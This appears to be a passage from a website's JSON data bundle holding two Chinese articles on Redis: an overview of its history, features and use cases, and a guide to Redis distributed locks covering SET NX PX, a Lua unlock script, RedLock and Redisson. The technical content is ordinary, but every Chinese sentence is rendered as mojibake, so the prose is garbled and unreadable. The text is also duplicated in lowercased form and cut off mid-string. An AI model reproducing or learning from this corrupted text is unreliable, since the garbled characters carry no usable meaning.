å¯ä»¥ç¨äºå­å¨ç¨æ·è¡ä¸ºæ°æ®ãååä¿¡æ¯ç­å®æ¶æ´æ°çæ°æ®ãå®è½å¤å¿«éå°å¤çæ¨èç®æ³çè®¡ç®åæ¥è¯¢è¯·æ±ï¼ä¸ºç¨æ·æä¾ä¸ªæ§åçæ¨èæå¡ã\n\n\n# Redis çæªæ¥\n\néçäºèç½çä¸æ­åå±ï¼Redis çåºç¨åºæ¯ä¹å°è¶æ¥è¶å¹¿æ³ãæªæ¥ï¼Redis å¯è½ä¼å¨ä»¥ä¸å ä¸ªæ¹é¢ææ´å¤§çåå±ï¼\n\n 1. åå¸å¼ç³»ç»ï¼éçäºè®¡ç®åå¤§æ°æ®ææ¯çåå±ï¼åå¸å¼ç³»ç»å°æ´å æ®åãRedis ä½ä¸ºåå¸å¼ç³»ç»çéè¦ç»æé¨åï¼å°ä¼å¨æ°æ®å­å¨ãæ°æ®åæ­¥åå®¹ç¾ç­æ¹é¢åæ¥æ´å¤§çä½ç¨ã\n 2. äººå·¥æºè½ï¼äººå·¥æºè½çåå±éè¦å¤§éçæ°æ®å¤çååæï¼Redis çé«æ§è½åä¸°å¯çæ°æ®ç»æå¯ä»¥æ»¡è¶³è¿äºéæ±ãæªæ¥ï¼Redis å¯è½ä¼å¨äººå·¥æºè½é¢åææ´å¹¿æ³çåºç¨ã\n 3. ç©èç½ï¼ç©èç½çåå±éè¦å¤§éçæ°æ®ééåå¤çï¼Redis çé«æ§è½åä½å»¶è¿å¯ä»¥æ»¡è¶³è¿äºéæ±ãæªæ¥ï¼Redis å¯è½ä¼å¨ç©èç½é¢åææ´å¹¿æ³çåºç¨ã\n 4. åºåé¾ï¼åºåé¾ææ¯éè¦å¤§éçæ°æ®å­å¨åéªè¯ï¼Redis çé«å¯é æ§åæ°æ®æä¹åå¯ä»¥æ»¡è¶³è¿äºéæ±ãæªæ¥ï¼Redis å¯è½ä¼å¨åºåé¾é¢åææ´å¹¿æ³çåºç¨ã",normalizedContent:"redisï¼remote dictionary serverï¼æ¯ä¸ä¸ªå¼æºçä½¿ç¨ ansi c ç¼åãæ¯æç½ç»ãå¯åºäºåå­äº¦å¯æä¹åçæ¥å¿åãkey-value æ°æ®åºï¼å¹¶æä¾å¤ç§è¯­è¨ç apiãä»åå­ä¸çï¼redis çåç§°æ¥èªè¥¿ç­çç âçº¢è²â è¿ä¸ªè¯ï¼æå³ç âçº¢è²ç¯ç¬¼â æ âçº¢è²æå¸âï¼è¡¨ç¤ºå¯¹æ°æ®åºå¿«éãå¯æ©å±ãé«å¯é æ§çè¿½æ±ã\n\n\n# redis çæ¥å\n\nredis çè¯çå¯ä»¥è¿½æº¯å° 2009 å¹´ï¼å½æ¶ salvatore sanfilippoï¼å³ antirezï¼ä¸ºäºè§£å³èªå·±å¨ä½¿ç¨ memcached æ¶éå°çä¸äºé®é¢ï¼å¼å§å¼å redisãmemcached æ¯ä¸ä¸ªå¼æºçåå­ä¸­çæ°æ®ç¼å­ç³»ç»ï¼ä¸»è¦ç¨äºåå°æ°æ®åºè®¿é®æ¬¡æ°ï¼ä»¥æé«ç½ç«çè®¿é®éåº¦ãç¶èï¼sanfilippo åç° memcached çåè½è¿äºç®åï¼æ æ³æ»¡è¶³ä¸äºå¤æçéæ±ï¼å¦æ°æ®æä¹ååæ°æ®åæ­¥ç­ãå æ­¤ï¼ä»å³å®å¼åä¸ä¸ªå¨æ°çæ°æ®åºï¼ä»¥æ»¡è¶³è¿äºéæ±ã\n\n\n# ä¸ºä½éè¦ redis\n\néçäºèç½çåå±ï¼æ°æ®éä¸æ­å¢é¿ï¼ä¼ ç»çå³ç³»åæ°æ®åºå¨å¤çå¤§éæ°æ®æ¶ï¼æ§è½éæ¸ä¸éãåæ¶ï¼éçåå¸å¼ç³»ç»çæ®åï¼æ°æ®ä¸è´æ§ååæ­¥é®é¢ä¹åå¾è¶æ¥è¶çªåºãredis çåºç°ï¼å°±æ¯ä¸ºäºè§£å³è¿äºé®é¢ã\n\né¦åï¼redis æ¯åå­æ°æ®åºï¼è¯»åéåº¦éå¸¸å¿«ï¼å¯ä»¥æ»¡è¶³é«å¹¶åãå¤§æ°æ®éçå¤çéæ±ãå¶æ¬¡ï¼redis æ¯æå¤ç§æ°æ®ç»æï¼åæ¬å­ç¬¦ä¸²ãåå¸ãåè¡¨ãéååæåºéåç­ï¼å¯ä»¥æ»¡è¶³åç§å¤æçä¸å¡éæ±ãæåï¼redis è¿æä¾äºä¸°å¯çæ°æ®æä½åäºå¡æ§å¶åè½ï¼å¯ä»¥ä¿è¯æ°æ®çä¸è´æ§åå¯é æ§ã\n\n\n# redis çåè½\n\n 1. æ°æ®ç»æï¼redis æ¯æå¤ç§æ°æ®ç»æï¼åæ¬å­ç¬¦ä¸²ãåå¸ãåè¡¨ãéååæåºéåç­ãè¿äºæ°æ®ç»æå¯ä»¥æ»¡è¶³åç§å¤æçä¸å¡éæ±ã\n 2. æ°æ®æä½ï¼redis æä¾äºä¸°å¯çæ°æ®æä½åäºå¡æ§å¶åè½ï¼åæ¬å¢å ãå é¤ãä¿®æ¹åæ¥è¯¢ç­æä½ãåæ¶ï¼redis è¿æ¯æäºå¡æ§å¶åä¹è§éç­æºå¶ï¼å¯ä»¥ä¿è¯æ°æ®çä¸è´æ§åå¯é æ§ã\n 3. æ°æ®æä¹åï¼redis æ¯æå¤ç§æ°æ®æä¹åæ¹å¼ï¼åæ¬ rdb å aof ç­ãrdb éè¿çææ°æ®å¿«ç§çæ¹å¼è¿è¡æä¹åï¼è aof åéè¿è®°å½æä½æ¥å¿çæ¹å¼è¿è¡æä¹åãè¿ä¸¤ç§æ¹å¼é½å¯ä»¥ä¿è¯æ°æ®çå¯é æ§åæ¢å¤è½åã\n 4. æ°æ®åæ­¥ï¼redis æ¯æä¸»ä»å¤å¶åéç¾¤å¤å¶ä¸¤ç§æ¹å¼è¿è¡æ°æ®åæ­¥ãä¸»ä»å¤å¶å¯ä»¥å®ç°è¯»ååç¦»åè´è½½åè¡¡ç­åè½ï¼èéç¾¤å¤å¶åå¯ä»¥å®ç°æ°æ®çåå¸å¼å­å¨åå®¹ç¾ç­åè½ã\n 5. åå¸å¼éï¼redis æä¾äºåå¸å¼éåè½ï¼å¯ä»¥å¨åå¸å¼ç³»ç»ä¸­å®ç°èµæºå±äº«åå¹¶åæ§å¶ç­åè½ã\n 6. å¶ä»åè½ï¼é¤äºä¸è¿°åè½å¤ï¼redis è¿æ¯ææ¶æ¯éåãåå¸è®¢éãlua èæ¬ç­åè½ã\n\n\n# redis çåºç¨åºæ¯\n\n 1.  ç¼å­ï¼redis ä½ä¸ºåå­æ°æ®åºï¼è¯»åéåº¦éå¸¸å¿«ï¼å¯ä»¥ä½ä¸ºç¼å­å±ä½¿ç¨ãéè¿å°ç­ç¹æ°æ®å­å¨å¨ redis ä¸­ï¼å¯ä»¥åå°å¯¹åç«¯æ°æ®åºçè®¿é®æ¬¡æ°ï¼æé«ç½ç«çè®¿é®éåº¦ã\n 2.  åå¸å¼ç³»ç»ï¼redis æ¯æåå¸å¼å­å¨åå¤å¶ç­åè½ï¼å¯ä»¥ç¨äºæå»ºåå¸å¼ç³»ç»ãéè¿å°æ°æ®åæ£å°å¤ä¸ªèç¹ä¸å­å¨ï¼å¯ä»¥å®ç°æ°æ®çåå¸å¼å¤çåå®¹ç¾ç­åè½ã\n 3.  æ¶æ¯éåï¼redis å¯ä»¥ä½ä¸ºæ¶æ¯éåä½¿ç¨ï¼å¯ä»¥å®ç°å¼æ­¥å¤çåæ¶æ¯çåå¸è®¢éç­åè½ãéè¿å°æ¶æ¯å­å¨å¨ redis ä¸­ï¼å¯ä»¥å®ç°æ¶æ¯çæä¹ååå¯é ä¼ è¾ç­åè½ã\n 4.  æ°æ®åºæ©å±ï¼redis å¯ä»¥ä½ä¸ºæ°æ®åºçæ©å±ä½¿ç¨ï¼å¯ä»¥å®ç°æ°æ®çå¿«éè¯»ååå¤çç­åè½ãéè¿å°é¨åæ°æ®å­å¨å¨ redis ä¸­ï¼å¯ä»¥åè½»æ°æ®åºçååï¼æé«ç³»ç»çæ§è½åå¯é æ§ã\n 5.  å®æ¶åæï¼redis çå¿«éè¯»åè½åä½¿å¶æä¸ºå®æ¶åæå·¥å·ççæ³éæ©ãå®å¯ä»¥ä½ä¸ºæ°æ®ç¼å²å±ï¼ä¸ºå®æ¶åææä¾è¶³å¤çæ°æ®å­å¨ç©ºé´åæ¥è¯¢æ§è½ã\n 6.  ç¤¾äº¤ç½ç»ï¼redis å¯ä»¥ç¨äºå®ç°ç¤¾äº¤ç½ç»ä¸­çåç§åè½ï¼å¦ç¨æ·è®¤è¯ãåå®¹åå¸ãå¥½åå³ç³»ç®¡çç­ãå®çé«éè¯»ååä¸°å¯çæ°æ®ç»æä½¿å¾è¿äºæä½åå¾ç®åé«æã\n 7.  æ¸¸æå¼åï¼å¨æ¸¸æå¼åä¸­ï¼redis å¯ä»¥ä½ä¸ºåç«¯æå¡å¨çä¸é¨åæ¥å¤çæ¸¸æé»è¾åç©å®¶æ°æ®ãå®æä¾çé«æ§è½åå¿«éååºä½¿å¾æ¸¸æä½éªæ´å æµçã\n 8.  ç©èç½ï¼å¨ç©èç½åºç¨ä¸­ï¼redis å¯ä»¥ç¨äºå­å¨åç®¡çä¼ æå¨æ°æ®ãè®¾å¤ç¶æç­ä¿¡æ¯ãå®çæä¹åååå¸å¼ç¹æ§ä½¿å¾ç©èç½è®¾å¤è½å¤å¯é å°å±äº«ååæ­¥æ°æ®ã\n 9.  ç¼å­ç½å³ï¼redis å¯ä»¥ä½ä¸ºç¼å­ç½å³æ¥ä¼å api è¯·æ±çæ§è½ãå®è½å¤å¿«éå°ååº api è¯·æ±å¹¶åå°å¯¹åç«¯æå¡çè°ç¨æ¬¡æ°ï¼ä»èæé«ç³»ç»çååéåååºéåº¦ã\n 10. å®æ¶æ¨èç³»ç»ï¼å¨å®æ¶æ¨èç³»ç»ä¸­ï¼redis å¯ä»¥ç¨äºå­å¨ç¨æ·è¡ä¸ºæ°æ®ãååä¿¡æ¯ç­å®æ¶æ´æ°çæ°æ®ãå®è½å¤å¿«éå°å¤çæ¨èç®æ³çè®¡ç®åæ¥è¯¢è¯·æ±ï¼ä¸ºç¨æ·æä¾ä¸ªæ§åçæ¨èæå¡ã\n\n\n# redis çæªæ¥\n\néçäºèç½çä¸æ­åå±ï¼redis çåºç¨åºæ¯ä¹å°è¶æ¥è¶å¹¿æ³ãæªæ¥ï¼redis å¯è½ä¼å¨ä»¥ä¸å ä¸ªæ¹é¢ææ´å¤§çåå±ï¼\n\n 1. åå¸å¼ç³»ç»ï¼éçäºè®¡ç®åå¤§æ°æ®ææ¯çåå±ï¼åå¸å¼ç³»ç»å°æ´å æ®åãredis ä½ä¸ºåå¸å¼ç³»ç»çéè¦ç»æé¨åï¼å°ä¼å¨æ°æ®å­å¨ãæ°æ®åæ­¥åå®¹ç¾ç­æ¹é¢åæ¥æ´å¤§çä½ç¨ã\n 2. äººå·¥æºè½ï¼äººå·¥æºè½çåå±éè¦å¤§éçæ°æ®å¤çååæï¼redis çé«æ§è½åä¸°å¯çæ°æ®ç»æå¯ä»¥æ»¡è¶³è¿äºéæ±ãæªæ¥ï¼redis å¯è½ä¼å¨äººå·¥æºè½é¢åææ´å¹¿æ³çåºç¨ã\n 3. ç©èç½ï¼ç©èç½çåå±éè¦å¤§éçæ°æ®ééåå¤çï¼redis çé«æ§è½åä½å»¶è¿å¯ä»¥æ»¡è¶³è¿äºéæ±ãæªæ¥ï¼redis å¯è½ä¼å¨ç©èç½é¢åææ´å¹¿æ³çåºç¨ã\n 4. åºåé¾ï¼åºåé¾ææ¯éè¦å¤§éçæ°æ®å­å¨åéªè¯ï¼redis çé«å¯é æ§åæ°æ®æä¹åå¯ä»¥æ»¡è¶³è¿äºéæ±ãæªæ¥ï¼redis å¯è½ä¼å¨åºåé¾é¢åææ´å¹¿æ³çåºç¨ã",charsets:{cjk:!0}},{title:"Redisåå¸å¼éä»ç»",frontmatter:{title:"Redisåå¸å¼éä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/redis/1602",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1602.Redis%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E4%BB%8B%E7%BB%8D.html",relativePath:"04.ä¸­é´ä»¶/03.redis/1602.Redisåå¸å¼éä»ç».md",key:"v-30342bb2",path:"/redis/1602/",headers:[{level:2,title:"è¿ç§æ¹å¼æå å¤§è¦ç¹ï¼",slug:"è¿ç§æ¹å¼æå å¤§è¦ç¹",normalizedTitle:"è¿ç§æ¹å¼æå å¤§è¦ç¹ï¼",charIndex:382},{level:2,title:"é¤äºè¦èèå®¢æ·ç«¯è¦æä¹å®ç°åå¸å¼éä¹å¤ï¼è¿éè¦èèredisçé¨ç½²é®é¢ï¼redisæ3ç§é¨ç½²æ¹å¼ï¼",slug:"é¤äºè¦èèå®¢æ·ç«¯è¦æä¹å®ç°åå¸å¼éä¹å¤-è¿éè¦èèredisçé¨ç½²é®é¢-redisæ3ç§é¨ç½²æ¹å¼",normalizedTitle:"é¤äºè¦èèå®¢æ·ç«¯è¦æä¹å®ç°åå¸å¼éä¹å¤ï¼è¿éè¦èè redis çé¨ç½²é®é¢ï¼redis æ 3 ç§é¨ç½²æ¹å¼ï¼",charIndex:655},{level:2,title:"å¦ä¸ç§æ¹å¼ï¼Redisson",slug:"å¦ä¸ç§æ¹å¼-redisson",normalizedTitle:"å¦ä¸ç§æ¹å¼ï¼redisson",charIndex:1304},{level:2,title:"å¯¹äºredisçåå¸å¼éèè¨ï¼å®æä»¥ä¸ç¼ºç¹ï¼",slug:"å¯¹äºredisçåå¸å¼éèè¨-å®æä»¥ä¸ç¼ºç¹",normalizedTitle:"å¯¹äº redis çåå¸å¼éèè¨ï¼å®æä»¥ä¸ç¼ºç¹ï¼",charIndex:2618}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"è¿ç§æ¹å¼æå å¤§è¦ç¹ï¼ é¤äºè¦èèå®¢æ·ç«¯è¦æä¹å®ç°åå¸å¼éä¹å¤ï¼è¿éè¦èèredisçé¨ç½²é®é¢ï¼redisæ3ç§é¨ç½²æ¹å¼ï¼ å¦ä¸ç§æ¹å¼ï¼Redisson å¯¹äºredisçåå¸å¼éèè¨ï¼å®æä»¥ä¸ç¼ºç¹ï¼",content:'ä½¿ç¨ Redis ååå¸å¼éçæè·¯å¤§æ¦æ¯è¿æ ·çï¼å¨ redis ä¸­è®¾ç½®ä¸ä¸ªå¼è¡¨ç¤ºå äºéï¼ç¶åéæ¾éçæ¶åå°±æè¿ä¸ª key å é¤ã\nå·ä½ä»£ç å¦ä¸ï¼\n\n// è·åé\n// NXæ¯æå¦ækeyä¸å­å¨å°±æåï¼keyå­å¨è¿åfalseï¼PXå¯ä»¥æå®è¿ææ¶é´\nSET anyLock unique_value NX PX 30000\n\n\n// éæ¾éï¼éè¿æ§è¡ä¸æ®µluaèæ¬\n// éæ¾éæ¶åå°ä¸¤æ¡æä»¤ï¼è¿ä¸¤æ¡æä»¤ä¸æ¯åå­æ§ç\n// éè¦ç¨å°redisçluaèæ¬æ¯æç¹æ§ï¼redisæ§è¡luaèæ¬æ¯åå­æ§ç\nif redis.call("get",KEYS[1]) == ARGV[1] then\nreturn redis.call("del",KEYS[1])\nelse\nreturn 0\nend\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# è¿ç§æ¹å¼æå å¤§è¦ç¹ï¼\n\n * ä¸å®è¦ç¨ SET key value NX PX milliseconds å½ä»¤\n   å¦æä¸ç¨ï¼åè®¾ç½®äºå¼ï¼åè®¾ç½®è¿ææ¶é´ï¼è¿ä¸ªä¸æ¯åå­æ§æä½ï¼æå¯è½å¨è®¾ç½®è¿ææ¶é´ä¹åå®æºï¼ä¼é ææ­»é (key æ°¸ä¹å­å¨)\n\n * value è¦å·æå¯ä¸æ§\n   è¿ä¸ªæ¯ä¸ºäºå¨è§£éçæ¶åï¼éè¦éªè¯ value æ¯åå éçä¸è´æå é¤ keyã\n   è¿æ¯é¿åäºä¸ç§æåµï¼åè®¾ A è·åäºéï¼è¿ææ¶é´ 30sï¼æ­¤æ¶ 35s ä¹åï¼éå·²ç»èªå¨éæ¾äºï¼A å»éæ¾éï¼ä½æ¯æ­¤æ¶å¯è½ B è·åäºéãA å®¢æ·ç«¯å°±ä¸è½å é¤ B çéäºã\n\n\n# é¤äºè¦èèå®¢æ·ç«¯è¦æä¹å®ç°åå¸å¼éä¹å¤ï¼è¿éè¦èè redis çé¨ç½²é®é¢ï¼redis æ 3 ç§é¨ç½²æ¹å¼ï¼\n\n * åæºæ¨¡å¼\n * master-slave + sentinel éä¸¾æ¨¡å¼\n * redis cluster æ¨¡å¼\n\nä½¿ç¨ redis ååå¸å¼éçç¼ºç¹å¨äºï¼å¦æéç¨åæºé¨ç½²æ¨¡å¼ï¼ä¼å­å¨åç¹é®é¢ï¼åªè¦ redis æéäºãå éå°±ä¸è¡äºã\n\néç¨ master-slave æ¨¡å¼ï¼å éçæ¶ååªå¯¹ä¸ä¸ªèç¹å éï¼å³ä¾¿éè¿ sentinel åäºé«å¯ç¨ï¼ä½æ¯å¦æ master èç¹æéäºï¼åçä¸»ä»åæ¢ï¼æ­¤æ¶å°±ä¼æå¯è½åºç°éä¸¢å¤±çé®é¢ã\n\nåºäºä»¥ä¸çèèï¼å¶å® redis çä½èä¹èèå°è¿ä¸ªé®é¢ï¼ä»æåºäºä¸ä¸ª RedLock çç®æ³ï¼è¿ä¸ªç®æ³çææå¤§æ¦æ¯è¿æ ·çï¼\nåè®¾ redis çé¨ç½²æ¨¡å¼æ¯ redis clusterï¼æ»å±æ 5 ä¸ª master èç¹ï¼éè¿ä»¥ä¸æ­¥éª¤è·åä¸æéï¼\n\n * è·åå½åæ¶é´æ³ï¼åä½æ¯æ¯«ç§\n * è½®æµå°è¯å¨æ¯ä¸ª master èç¹ä¸åå»ºéï¼è¿ææ¶é´è®¾ç½®è¾ç­ï¼ä¸è¬å°±å åæ¯«ç§\n * å°è¯å¨å¤§å¤æ°èç¹ä¸å»ºç«ä¸ä¸ªéï¼æ¯å¦ 5 ä¸ªèç¹å°±è¦æ±æ¯ 3 ä¸ªèç¹ï¼n / 2 +1ï¼\n * å®¢æ·ç«¯è®¡ç®å»ºç«å¥½éçæ¶é´ï¼å¦æå»ºç«éçæ¶é´å°äºè¶æ¶æ¶é´ï¼å°±ç®å»ºç«æåäº\n * è¦æ¯éå»ºç«å¤±è´¥äºï¼é£ä¹å°±ä¾æ¬¡å é¤è¿ä¸ªé\n * åªè¦å«äººå»ºç«äºä¸æåå¸å¼éï¼ä½ å°±å¾ä¸æ­è½®è¯¢å»å°è¯è·åé\n\nä½æ¯è¿æ ·çè¿ç§ç®æ³è¿æ¯é¢å·äºè®®çï¼å¯è½è¿ä¼å­å¨ä¸å°çé®é¢ï¼æ æ³ä¿è¯å éçè¿ç¨ä¸å®æ­£ç¡®ã\n\n\n\n\n# å¦ä¸ç§æ¹å¼ï¼Redisson\n\næ­¤å¤ï¼å®ç° Redis çåå¸å¼éï¼é¤äºèªå·±åºäº redis client åç api æ¥å®ç°ä¹å¤ï¼è¿å¯ä»¥ä½¿ç¨å¼æºæ¡æ¶ï¼Redission\n\nRedisson æ¯ä¸ä¸ªä¼ä¸çº§çå¼æº Redis Clientï¼ä¹æä¾äºåå¸å¼éçæ¯æãæä¹éå¸¸æ¨èå¤§å®¶ä½¿ç¨ï¼ä¸ºä»ä¹å¢ï¼\n\nåæ³ä¸ä¸ä¸é¢è¯´çï¼å¦æèªå·±åä»£ç æ¥éè¿ redis è®¾ç½®ä¸ä¸ªå¼ï¼æ¯éè¿ä¸é¢è¿ä¸ªå½ä»¤è®¾ç½®çã\n\nSET anyLock unique_value NX PX 30000\n\n\n1\n\n\nè¿éè®¾ç½®çè¶æ¶æ¶é´æ¯ 30sï¼åå¦æè¶è¿ 30s é½è¿æ²¡æå®æä¸å¡é»è¾çæåµä¸ï¼key ä¼è¿æï¼å¶ä»çº¿ç¨æå¯è½ä¼è·åå°éã\n\nè¿æ ·ä¸æ¥çè¯ï¼ç¬¬ä¸ä¸ªçº¿ç¨è¿æ²¡æ§è¡å®ä¸å¡é»è¾ï¼ç¬¬äºä¸ªçº¿ç¨è¿æ¥äºä¹ä¼åºç°çº¿ç¨å®å¨é®é¢ãæä»¥æä»¬è¿éè¦é¢å¤çå»ç»´æ¤è¿ä¸ªè¿ææ¶é´ï¼å¤ªéº»ç¦äºï½\n\næä»¬æ¥çç redisson æ¯æä¹å®ç°çï¼åæåä¸ä¸ä½¿ç¨ redission çç½ï¼\n\nConfig config = new Config();\nconfig.useClusterServers()\n.addNodeAddress("redis://192.168.31.101:7001")\n.addNodeAddress("redis://192.168.31.101:7002")\n.addNodeAddress("redis://192.168.31.101:7003")\n.addNodeAddress("redis://192.168.31.102:7001")\n.addNodeAddress("redis://192.168.31.102:7002")\n.addNodeAddress("redis://192.168.31.102:7003");\n\nRedissonClient redisson = Redisson.create(config);\n\n\nRLock lock = redisson.getLock("anyLock");\nlock.lock();\nlock.unlock();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nå°±æ¯è¿ä¹ç®åï¼æä»¬åªéè¦éè¿å®ç api ä¸­ç lock å unlock å³å¯å®æåå¸å¼éï¼ä»å¸®æä»¬èèäºå¾å¤ç»èï¼\n\n * redisson æææä»¤é½éè¿ lua èæ¬æ§è¡ï¼redis æ¯æ lua èæ¬åå­æ§æ§è¡\n * redisson è®¾ç½®ä¸ä¸ª key çé»è®¤è¿ææ¶é´ä¸º 30s, å¦ææä¸ªå®¢æ·ç«¯ææä¸ä¸ªéè¶è¿äº 30s æä¹åï¼\n   redisson ä¸­æä¸ä¸ª watchdog çæ¦å¿µï¼ç¿»è¯è¿æ¥å°±æ¯çé¨çï¼å®ä¼å¨ä½ è·åéä¹åï¼æ¯é 10 ç§å¸®ä½ æ key çè¶æ¶æ¶é´è®¾ä¸º 30s\n   è¿æ ·çè¯ï¼å°±ç®ä¸ç´ææéä¹ä¸ä¼åºç° key è¿æäºï¼å¶ä»çº¿ç¨è·åå°éçé®é¢äºã\n * redisson ç âçé¨çâ é»è¾ä¿è¯äºæ²¡ææ­»éåçã\n   å¦ææºå¨å®æºäºï¼çé¨çä¹å°±æ²¡äºãæ­¤æ¶å°±ä¸ä¼å»¶é¿ key çè¿ææ¶é´ï¼å°äº 30s ä¹åå°±ä¼èªå¨è¿æäºï¼å¶ä»çº¿ç¨å¯ä»¥è·åå°é)\n\n\n# å¯¹äº redis çåå¸å¼éèè¨ï¼å®æä»¥ä¸ç¼ºç¹ï¼\n\n * å®è·åéçæ¹å¼ç®åç²æ´ï¼è·åä¸å°éç´æ¥ä¸æ­å°è¯è·åéï¼æ¯è¾æ¶èæ§è½ã\n * å¦å¤æ¥è¯´çè¯ï¼redis çè®¾è®¡å®ä½å³å®äºå®çæ°æ®å¹¶ä¸æ¯å¼ºä¸è´æ§ç (redis ä¸ç´æ§é®é¢çè¿é)ï¼å¨æäºæç«¯æåµä¸ï¼å¯è½ä¼åºç°é®é¢ãéçæ¨¡åä¸å¤å¥å£®\n * å³ä¾¿ä½¿ç¨ redlock ç®æ³æ¥å®ç°ï¼å¨æäºå¤æåºæ¯ä¸ï¼ä¹æ æ³ä¿è¯å¶å®ç° 100% æ²¡æé®é¢ï¼å³äº redlock çè®¨è®ºå¯ä»¥ç How to do distributed locking\n * redis åå¸å¼éï¼å¶å®éè¦èªå·±ä¸æ­å»å°è¯è·åéï¼æ¯è¾æ¶èæ§è½ã\n\nä½æ¯å¦ä¸æ¹é¢ä½¿ç¨ redis å®ç°åå¸å¼éå¨å¾å¤ä¼ä¸ä¸­éå¸¸å¸¸è§ï¼èä¸å¤§é¨åæåµä¸é½ä¸ä¼éå°æè°ç âæç«¯å¤æåºæ¯â\n\næä»¥ä½¿ç¨ redis ä½ä¸ºåå¸å¼éä¹ä¸å¤±ä¸ºä¸ç§å¥½çæ¹æ¡ï¼æéè¦çä¸ç¹æ¯ redis çæ§è½å¾é«ï¼å¯ä»¥æ¯æé«å¹¶åçè·åãéæ¾éæä½ã\n\nspring boot æ´å redisson çä¸¤ç§æ¹å¼ï¼\nèªå·±éç½®æ¹å¼ï¼https://www.cnblogs.com/yangzhilong/p/7605807.html\nspring boot starter æ¹å¼ï¼https://blog.csdn.net/a1058926697/article/details/116670391',normalizedContent:'ä½¿ç¨ redis ååå¸å¼éçæè·¯å¤§æ¦æ¯è¿æ ·çï¼å¨ redis ä¸­è®¾ç½®ä¸ä¸ªå¼è¡¨ç¤ºå äºéï¼ç¶åéæ¾éçæ¶åå°±æè¿ä¸ª key å é¤ã\nå·ä½ä»£ç å¦ä¸ï¼\n\n// è·åé\n// nxæ¯æå¦ækeyä¸å­å¨å°±æåï¼keyå­å¨è¿åfalseï¼pxå¯ä»¥æå®è¿ææ¶é´\nset anylock unique_value nx px 30000\n\n\n// éæ¾éï¼éè¿æ§è¡ä¸æ®µluaèæ¬\n// éæ¾éæ¶åå°ä¸¤æ¡æä»¤ï¼è¿ä¸¤æ¡æä»¤ä¸æ¯åå­æ§ç\n// éè¦ç¨å°redisçluaèæ¬æ¯æç¹æ§ï¼redisæ§è¡luaèæ¬æ¯åå­æ§ç\nif redis.call("get",keys[1]) == argv[1] then\nreturn redis.call("del",keys[1])\nelse\nreturn 0\nend\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# è¿ç§æ¹å¼æå å¤§è¦ç¹ï¼\n\n * ä¸å®è¦ç¨ set key value nx px milliseconds å½ä»¤\n   å¦æä¸ç¨ï¼åè®¾ç½®äºå¼ï¼åè®¾ç½®è¿ææ¶é´ï¼è¿ä¸ªä¸æ¯åå­æ§æä½ï¼æå¯è½å¨è®¾ç½®è¿ææ¶é´ä¹åå®æºï¼ä¼é ææ­»é (key æ°¸ä¹å­å¨)\n\n * value è¦å·æå¯ä¸æ§\n   è¿ä¸ªæ¯ä¸ºäºå¨è§£éçæ¶åï¼éè¦éªè¯ value æ¯åå éçä¸è´æå é¤ keyã\n   è¿æ¯é¿åäºä¸ç§æåµï¼åè®¾ a è·åäºéï¼è¿ææ¶é´ 30sï¼æ­¤æ¶ 35s ä¹åï¼éå·²ç»èªå¨éæ¾äºï¼a å»éæ¾éï¼ä½æ¯æ­¤æ¶å¯è½ b è·åäºéãa å®¢æ·ç«¯å°±ä¸è½å é¤ b çéäºã\n\n\n# é¤äºè¦èèå®¢æ·ç«¯è¦æä¹å®ç°åå¸å¼éä¹å¤ï¼è¿éè¦èè redis çé¨ç½²é®é¢ï¼redis æ 3 ç§é¨ç½²æ¹å¼ï¼\n\n * åæºæ¨¡å¼\n * master-slave + sentinel éä¸¾æ¨¡å¼\n * redis cluster æ¨¡å¼\n\nä½¿ç¨ redis ååå¸å¼éçç¼ºç¹å¨äºï¼å¦æéç¨åæºé¨ç½²æ¨¡å¼ï¼ä¼å­å¨åç¹é®é¢ï¼åªè¦ redis æéäºãå éå°±ä¸è¡äºã\n\néç¨ master-slave æ¨¡å¼ï¼å éçæ¶ååªå¯¹ä¸ä¸ªèç¹å éï¼å³ä¾¿éè¿ sentinel åäºé«å¯ç¨ï¼ä½æ¯å¦æ master èç¹æéäºï¼åçä¸»ä»åæ¢ï¼æ­¤æ¶å°±ä¼æå¯è½åºç°éä¸¢å¤±çé®é¢ã\n\nåºäºä»¥ä¸çèèï¼å¶å® redis çä½èä¹èèå°è¿ä¸ªé®é¢ï¼ä»æåºäºä¸ä¸ª redlock çç®æ³ï¼è¿ä¸ªç®æ³çææå¤§æ¦æ¯è¿æ ·çï¼\nåè®¾ redis çé¨ç½²æ¨¡å¼æ¯ redis clusterï¼æ»å±æ 5 ä¸ª master èç¹ï¼éè¿ä»¥ä¸æ­¥éª¤è·åä¸æéï¼\n\n * è·åå½åæ¶é´æ³ï¼åä½æ¯æ¯«ç§\n * è½®æµå°è¯å¨æ¯ä¸ª master èç¹ä¸åå»ºéï¼è¿ææ¶é´è®¾ç½®è¾ç­ï¼ä¸è¬å°±å åæ¯«ç§\n * å°è¯å¨å¤§å¤æ°èç¹ä¸å»ºç«ä¸ä¸ªéï¼æ¯å¦ 5 ä¸ªèç¹å°±è¦æ±æ¯ 3 ä¸ªèç¹ï¼n / 2 +1ï¼\n * å®¢æ·ç«¯è®¡ç®å»ºç«å¥½éçæ¶é´ï¼å¦æå»ºç«éçæ¶é´å°äºè¶æ¶æ¶é´ï¼å°±ç®å»ºç«æåäº\n * è¦æ¯éå»ºç«å¤±è´¥äºï¼é£ä¹å°±ä¾æ¬¡å é¤è¿ä¸ªé\n * åªè¦å«äººå»ºç«äºä¸æåå¸å¼éï¼ä½ å°±å¾ä¸æ­è½®è¯¢å»å°è¯è·åé\n\nä½æ¯è¿æ ·çè¿ç§ç®æ³è¿æ¯é¢å·äºè®®çï¼å¯è½è¿ä¼å­å¨ä¸å°çé®é¢ï¼æ æ³ä¿è¯å éçè¿ç¨ä¸å®æ­£ç¡®ã\n\n\n\n\n# å¦ä¸ç§æ¹å¼ï¼redisson\n\næ­¤å¤ï¼å®ç° redis çåå¸å¼éï¼é¤äºèªå·±åºäº redis client åç api æ¥å®ç°ä¹å¤ï¼è¿å¯ä»¥ä½¿ç¨å¼æºæ¡æ¶ï¼redission\n\nredisson 